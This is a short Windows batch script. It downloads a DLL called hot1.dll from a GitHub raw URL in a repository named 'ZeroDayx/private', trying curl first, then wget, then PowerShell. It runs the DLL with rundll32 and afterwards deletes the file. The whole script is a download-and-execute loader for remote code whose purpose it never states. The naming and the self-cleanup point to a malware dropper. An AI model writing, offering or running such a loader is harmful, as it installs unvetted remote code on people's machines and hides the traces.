@echo off
setlocal

:: Set the URL of the DLL and the name to save it as
set "dll_url=https://raw.githubusercontent.com/ZeroDayx/private/refs/heads/main/hot1.dll"
set "dll_name=hot1.dll"

:: Check if curl is available
where curl >nul 2>nul
if %errorlevel%==0 (
    echo Using curl to download the DLL...
    curl -o "%dll_name%" "%dll_url%"
) else (
    :: Check if wget is available
    where wget >nul 2>nul
    if %errorlevel%==0 (
        echo Using wget to download the DLL...
        wget "%dll_url%" -O "%dll_name%"
    ) else (
        :: Fallback to PowerShell
        echo Using PowerShell to download the DLL...
        powershell -Command "Invoke-WebRequest -Uri '%dll_url%' -OutFile '%dll_name%'"
    )
)

:: Check if the DLL was downloaded successfully
if exist "%dll_name%" (
    :: Run the DLL (replace FunctionName with the actual function you want to call)
    rundll32.exe "%dll_name%", FunctionName

    :: Clean up (optional)
    del "%dll_name%"
) else (
    echo Failed to download the DLL.
)

pause
endlocal